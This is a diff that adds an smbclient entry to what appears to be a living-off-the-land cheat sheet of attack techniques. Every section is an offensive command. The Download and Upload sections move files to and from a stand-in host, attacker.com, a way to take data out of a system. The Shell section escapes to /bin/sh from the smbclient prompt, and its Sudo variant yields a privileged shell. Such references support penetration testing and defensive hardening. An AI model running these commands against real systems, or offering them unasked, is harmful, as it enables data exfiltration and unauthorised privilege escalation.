@@ -1,0 +1,33 @@
+smbclient
+=========
+
+Download
+--------
+
+[Sudo]
+    smbclient '\\attacker.com\share' -c 'get /path/to/input-file /path/to/output-file'
+
+[Unprivileged]
+    smbclient '\\attacker.com\share' -c 'get /path/to/input-file /path/to/output-file'
+
+Shell
+-----
+
+[Sudo]
+    smbclient '\\host\share'
+!/bin/sh
+    A valid SMB/CIFS server must be available.
+
+[Unprivileged]
+    smbclient '\\host\share'
+!/bin/sh
+    A valid SMB/CIFS server must be available.
+
+Upload
+------
+
+[Sudo]
+    smbclient '\\attacker.com\share' -c 'put /path/to/input-file /path/to/output-file'
+
+[Unprivileged]
+    smbclient '\\attacker.com\share' -c 'put /path/to/input-file /path/to/output-file'
